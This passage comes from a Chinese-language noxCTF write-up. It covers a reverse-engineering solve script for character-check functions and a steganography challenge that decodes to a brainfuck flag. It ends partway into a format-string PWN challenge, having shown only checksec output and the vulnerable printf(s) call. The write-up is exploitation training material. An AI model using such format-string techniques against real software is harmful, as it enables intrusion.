__<span class="function">fastcall <span class="title">check_prime</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)c &gt; <span class="number">1u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)c &gt; <span class="number">2u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">2</span>; v3 &amp;&amp; i &lt; (<span class="keyword">unsigned</span> __int8)c; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !((<span class="keyword">unsigned</span> __int8)c % i) )</span><br><span class="line">          v3 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第五和第六个字符相互异或等于126：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check6</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_prime(s[<span class="number">4</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_prime(s[<span class="number">5</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)s[<span class="number">4</span>] ^ (<span class="keyword">unsigned</span> __int8)s[<span class="number">5</span>]) != <span class="number">126</span> )</span><br><span class="line">        v2 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第七个字符的1/2是素数，且第七个字符等于第六个字符减去42的两倍：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check7</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_prime(s[<span class="number">6</span>] / <span class="number">2</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">6</span>] != <span class="number">2</span> * (s[<span class="number">5</span>] - <span class="number">42</span>) )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第八个数字在(47, 57]范围内，右移两位后乘四等于本身：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check8</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( s[<span class="number">7</span>] &lt;= <span class="number">47</span> || s[<span class="number">7</span>] &gt; <span class="number">57</span> )</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4</span> * (<span class="keyword">char</span>)(s[<span class="number">7</span>] &gt;&gt; <span class="number">2</span>) != s[<span class="number">7</span>] )</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入数字与第八个字符异或得到第九个字符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __usercall check9@&lt;rax&gt;(<span class="keyword">unsigned</span> __int8 a1@&lt;efl&gt;, __int64 a2, <span class="keyword">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> s[<span class="number">8</span>] == (a1 ^ (<span class="keyword">unsigned</span> __int8)s[<span class="number">7</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两倍关系：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check10</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">2</span> * a1[<span class="number">8</span>] != a1[<span class="number">9</span>] )</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算得出第十一个数字：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">check11</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, <span class="keyword">char</span> *a8)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v8; <span class="comment">// rcx</span></span><br><span class="line">  __int16 sum; <span class="comment">// ax</span></span><br><span class="line"></span><br><span class="line">  v8 = (<span class="keyword">unsigned</span> __int8)a8[<span class="number">9</span>];</span><br><span class="line">  sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    sum += v8--;</span><br><span class="line">  <span class="keyword">while</span> ( v8 );</span><br><span class="line">  <span class="keyword">return</span> a8[<span class="number">10</span>] == HIBYTE(sum) * (_BYTE)sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑相对比较常规，但做下来有些耗时。最后写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">primes = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>, i):</span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            primes.append(i)</span><br><span class="line"></span><br><span class="line">s = <span class="number">11</span> * [<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># s[0], s[1] = 37, 94 # %^Jv!_j0"Dz ==&gt; wrong</span></span><br><span class="line">s[<span class="number">0</span>], s[<span class="number">1</span>] = <span class="number">47</span>, <span class="number">74</span> <span class="comment"># /JTl!_j0"Dz ==&gt; right</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(s[<span class="number">0</span>] * s[<span class="number">1</span>] == <span class="number">3478</span>)</span><br><span class="line"></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] ^ s[<span class="number">1</span>] ^ <span class="number">49</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(s[<span class="number">2</span>] + <span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i * i % <span class="number">256</span> == s[<span class="number">2</span>] * s[<span class="number">2</span>] % <span class="number">256</span>:</span><br><span class="line">        s[<span class="number">3</span>] = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get456</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">32</span> <span class="keyword">and</span> j &gt; <span class="number">32</span> <span class="keyword">and</span> (i ^ j) % <span class="number">256</span> == <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">if</span> j - <span class="number">42</span> <span class="keyword">in</span> primes <span class="keyword">and</span> <span class="number">2</span> * j &lt; <span class="number">256</span>:</span><br><span class="line">                    <span class="keyword">return</span> (i, j, <span class="number">2</span> * (j - <span class="number">42</span>))</span><br><span class="line"></span><br><span class="line">s[<span class="number">4</span>], s[<span class="number">5</span>], s[<span class="number">6</span>] = get456()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>, <span class="number">58</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">4</span> * (i &gt;&gt; <span class="number">2</span>) == i:</span><br><span class="line">        s[<span class="number">7</span>] = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">s[<span class="number">8</span>] = <span class="number">0x12</span> ^ s[<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">s[<span class="number">9</span>] = <span class="number">2</span> * s[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">s[<span class="number">10</span>] = <span class="number">0x7A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">assert</span>(c &gt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">''</span>.join(map(chr, s)))</span><br></pre></td></tr></table></figure><p>据说这里可以符号执行用angr做。</p><h1 id="MISC-Blind-Date"><a href="#MISC-Blind-Date" class="headerlink" title="MISC-Blind Date"></a>MISC-Blind Date</h1><p><code>xxd</code>一下文件头，根据jpeg文件头特征可以发现每四字节被倒过来了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~ &gt; xxd BlindDate.jpeg | head</span><br><span class="line">00000000: e0ff d8ff 464a 1000 0100 4649 6000 0101  ....FJ....FI`...</span><br><span class="line">00000010: 0000 6000 2200 e1ff 6669 7845 4d4d 0000  ..`."...fixEMM..</span><br><span class="line">00000020: 0000 2a00 0100 0800 0300 1201 0100 0000  ..*.............</span><br><span class="line">00000030: 0000 0100 0000 0000 1100 ecff 6b63 7544  ............kcuD</span><br><span class="line">00000040: 0001 0079 0000 0004 ff00 004b 687e 03e1  ...y.......Kh~..</span><br><span class="line">00000050: 3a70 7474 736e 2f2f 6f64 612e 632e 6562  :pttsn//oda.c.eb</span><br><span class="line">00000060: 782f 6d6f 312f 7061 002f 302e 7078 3f3c  x/mo1/pa./0.px?&lt;</span><br><span class="line">00000070: 656b 6361 6562 2074 3d6e 6967 bfbb ef22  ekcaeb t=nig..."</span><br><span class="line">00000080: 6469 2022 3557 223d 704d 304d 6968 6543  di "5W"=pM0MiheC</span><br><span class="line">00000090: 6572 7a48 544e 7a53 636b 7a63 3f22 6439  erzHTNzSckzc?"d9</span><br></pre></td></tr></table></figure><p>用脚本过逆回来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'BlindDate.jpeg'</span>, <span class="string">'rb'</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">4</span>):</span><br><span class="line">    data += s[i:i + <span class="number">4</span>][::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">new_f = open(<span class="string">'re_BlindData.jpeg'</span>, <span class="string">'wb'</span>)</span><br><span class="line">new_f.write(data)</span><br></pre></td></tr></table></figure><p><code>strings</code>一下新文件，发现一串base64字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Li4gICAuICAuLiAgLi4gICAuICAuLiAgLi4gICAuICAuLiAgLiAgLi4NCi4gICAgLiAgIC4gICAgICAgLiAgICAgIC4gICAgLiAgIC4gIC4gIA0KICAgIC4uICAgICAgICAgIC4uICAgICAgLiAgIC4uICAgICAgLiAgLgPK</span><br></pre></td></tr></table></figure><p>解开后发现是盲文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">..   .  ..  ..   .  ..  ..   .  ..  .  ..</span><br><span class="line">.    .   .       .      .    .   .  .  </span><br><span class="line">    ..          ..      .   ..      .  .</span><br></pre></td></tr></table></figure><p>翻译一下之后是：<code>F4C3P4LM</code></p><p><code>binwalk</code>一下新文件，分解出一个带密码的7z压缩文件。把上面的字符串作为密码解开，得到flag文本，是brainfuck：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;&lt;<span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;&lt;<span class="literal">-</span><span class="string">.</span>&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="string">.</span>&gt;<span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;&lt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;&lt;<span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;&lt;&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span></span><br></pre></td></tr></table></figure><p>解密得到flag：<code>noxCTF{W0uld_y0u_bl1nd_d4t3_4_bl1nd_d4t3?}</code></p><h1 id="PWN-believeMe"><a href="#PWN-believeMe" class="headerlink" title="PWN-believeMe"></a>PWN-believeMe</h1><p>做出的第一道格式化字符串。拿到题目先file一下，然后再看看开了什么保护：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[noxCTF-believeMe] file believeMe                                      1:36:01 </span><br><span class="line">believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped</span><br><span class="line">[noxCTF-believeMe] checksec believeMe                                  1:36:06 </span><br><span class="line">[*] '/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>然后拖进ida中查看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+14h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(aSomeoneToldMeT);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">39</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">"\n"</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数中对字符串长度做了限制，并且存在明显的格式化字符串漏洞。然后很容易发现有一个奇怪的函数<code>noxFlag</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">noxFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> i; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = fgetc(stream); i != <span 